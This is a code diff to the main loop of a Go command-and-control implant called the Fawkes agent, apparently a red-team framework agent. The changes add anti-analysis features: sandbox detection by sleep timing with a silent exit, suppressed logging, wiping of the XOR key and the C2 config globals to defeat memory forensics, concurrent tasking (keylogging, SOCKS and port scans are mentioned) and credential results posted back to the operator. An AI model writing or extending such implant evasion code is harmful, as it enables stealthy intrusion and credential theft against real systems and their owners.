@@ -5,6 +5,7 @@ import (
 	"encoding/base64"
 	"encoding/json"
 	"fmt"
+	"io"
 	"log"
 	"math/rand"
 	"net"
@@ -32,18 +33,18 @@ import (
 
 var (
 	// These variables are populated at build time by the Go linker
-	payloadUUID  string = ""
-	callbackHost string = ""
-	callbackPort  string = "443"
-	userAgent     string = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
-	sleepInterval string = "10"
-	jitter        string = "10"
-	encryptionKey string = ""
-	killDate      string = "0"
-	maxRetries    string = "10"
-	debug         string = "false"
-	getURI        string = "/data"
-	postURI       string = "/data"
+	payloadUUID       string = ""
+	callbackHost      string = ""
+	callbackPort      string = "443"
+	userAgent         string = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
+	sleepInterval     string = "10"
+	jitter            string = "10"
+	encryptionKey     string = ""
+	killDate          string = "0"
+	maxRetries        string = "10"
+	debug             string = "false"
+	getURI            string = "/data"
+	postURI           string = "/data"
 	hostHeader        string = ""     // Override Host header for domain fronting
 	proxyURL          string = ""     // HTTP/SOCKS proxy URL (e.g., http://proxy:8080)
 	tlsVerify         string = "none" // TLS verification: none, system-ca, pinned:<fingerprint>
@@ -62,6 +63,7 @@ var (
 	blockDLLs         string = ""     // Block non-Microsoft DLLs in child processes (Windows only)
 	indirectSyscalls  string = ""     // Enable indirect syscalls at startup (Windows only)
 	xorKey            string = ""     // Base64 XOR key for C2 string deobfuscation (empty = plaintext)
+	sandboxGuard      string = ""     // Detect sleep skipping (sandbox fast-forward) and exit silently
 )
 
 func main() {
@@ -83,6 +85,8 @@ func runAgent() {
 			hostHeader = xorDecodeString(hostHeader, keyBytes)
 			proxyURL = xorDecodeString(proxyURL, keyBytes)
 			customHeaders = xorDecodeString(customHeaders, keyBytes)
+			// Zero the XOR key — no longer needed after deobfuscation
+			zeroBytes(keyBytes)
 		}
 	}
 
@@ -117,10 +121,11 @@ func runAgent() {
 		debugBool = false
 	}
 
-	// Setup logging
+	// Setup logging — suppress all output in production to avoid leaking operational details to stderr
 	if debugBool {
 		log.SetOutput(os.Stdout)
-		// log.Println("[DEBUG] Starting Fawkes agent")
+	} else {
+		log.SetOutput(io.Discard)
 	}
 
 	// Verify required configuration
@@ -280,6 +285,11 @@ func runAgent() {
 		commands.SetBlockDLLs(true)
 	}
 
+	// Clear build-time globals — all values have been copied into agent/profile structs.
+	// Prevents memory forensics from extracting sensitive config from the data segment.
+	sandboxGuardEnabled := sandboxGuard == "true"
+	clearGlobals()
+
 	// Initialize command handlers
 	commands.Initialize()
 
@@ -333,12 +343,15 @@ checkinDone:
 
 	// Start main execution loop - run directly (not as goroutine) so DLL exports block properly
 	log.Printf("[INFO] Starting main execution loop for agent %s", agent.PayloadUUID[:8])
-	mainLoop(ctx, agent, c2, socksManager, maxRetriesInt)
+	mainLoop(ctx, agent, c2, socksManager, maxRetriesInt, sandboxGuardEnabled)
 	usePadding() // Reference embedded padding to prevent compiler stripping
 	log.Printf("[INFO] Fawkes agent shutdown complete")
 }
 
-func mainLoop(ctx context.Context, agent *structs.Agent, c2 profiles.Profile, socksManager *socks.Manager, maxRetriesInt int) {
+func mainLoop(ctx context.Context, agent *structs.Agent, c2 profiles.Profile, socksManager *socks.Manager, maxRetriesInt int, sandboxGuardEnabled bool) {
+	// Semaphore to limit concurrent task goroutines (prevents memory exhaustion)
+	taskSem := make(chan struct{}, 20)
+
 	// Main execution loop
 	retryCount := 0
 	for {
@@ -394,19 +407,35 @@ func mainLoop(ctx context.Context, agent *structs.Agent, c2 profiles.Profile, so
 				socksManager.HandleMessages(inboundSocks)
 			}
 
-			// Process tasks
+			// Process tasks concurrently — each task runs in its own goroutine
+			// so long-running commands (SOCKS, keylog, port-scan) don't block new tasks.
+			// Semaphore limits concurrency to prevent memory exhaustion.
 			for _, task := range tasks {
-				processTaskWithAgent(task, agent, c2, socksManager)
+				taskSem <- struct{}{} // Acquire semaphore slot
+				go func(t structs.Task) {
+					defer func() { <-taskSem }() // Release slot when done
+					commands.TrackTask(&t)
+					defer commands.UntrackTask(t.ID)
+					processTaskWithAgent(t, agent, c2, socksManager)
+				}(task)
 			}
 
-			// Sleep before next iteration
+			// Sleep before next iteration — with optional sandbox detection
 			sleepTime := calculateSleepTime(agent.SleepInterval, agent.Jitter)
-			time.Sleep(sleepTime)
+			if sandboxGuardEnabled {
+				if !guardedSleep(sleepTime) {
+					log.Printf("[INFO] Sleep skipping detected, exiting")
+					return
+				}
+			} else {
+				time.Sleep(sleepTime)
+			}
 		}
 	}
 }
 
 func processTaskWithAgent(task structs.Task, agent *structs.Agent, c2 profiles.Profile, socksManager *socks.Manager) {
+	task.StartTime = time.Now()
 	log.Printf("[INFO] Processing task: %s (ID: %s)", task.Command, task.ID)
 
 	// Create Job struct with channels for this task
@@ -511,11 +540,12 @@ func processTaskWithAgent(task structs.Task, agent *structs.Agent, c2 profiles.P
 
 	// Send final response
 	response := structs.Response{
-		TaskID:     task.ID,
-		UserOutput: result.Output,
-		Status:     result.Status,
-		Completed:  result.Completed,
-		Processes:  result.Processes,
+		TaskID:      task.ID,
+		UserOutput:  result.Output,
+		Status:      result.Status,
+		Completed:   result.Completed,
+		Processes:   result.Processes,
+		Credentials: result.Credentials,
 	}
 	if _, err := c2.PostResponse(response, agent, socksManager.DrainOutbound()); err != nil {
 		log.Printf("[ERROR] Failed to post response: %v", err)
@@ -664,4 +694,45 @@ func xorDecodeString(encoded string, key []byte) string {
 		result[i] = b ^ key[i%len(key)]
 	}
 	return string(result)
+}
+
+// guardedSleep performs a sleep with sandbox detection. If the sleep completes
+// in less than 75% of the expected duration, it indicates a sandbox is
+// fast-forwarding time. Returns true if sleep was normal, false if skipped.
+func guardedSleep(d time.Duration) bool {
+	if d <= 0 {
+		return true
+	}
+	before := time.Now()
+	time.Sleep(d)
+	elapsed := time.Since(before)
+	// If less than 75% of the requested duration actually elapsed,
+	// the sandbox is accelerating time.
+	threshold := d * 3 / 4
+	return elapsed >= threshold
+}
+
+// zeroBytes overwrites a byte slice with zeros to clear sensitive data from memory.
+func zeroBytes(b []byte) {
+	for i := range b {
+		b[i] = 0
+	}
+}
+
+// clearGlobals zeros out build-time global variables after they have been
+// copied into the agent/profile structs. This prevents sensitive config
+// data (encryption keys, C2 URLs, UUIDs) from lingering in the binary's
+// data segment where memory forensics tools could extract them.
+func clearGlobals() {
+	payloadUUID = ""
+	callbackHost = ""
+	callbackPort = ""
+	userAgent = ""
+	encryptionKey = ""
+	getURI = ""
+	postURI = ""
+	hostHeader = ""
+	proxyURL = ""
+	customHeaders = ""
+	xorKey = ""
 }
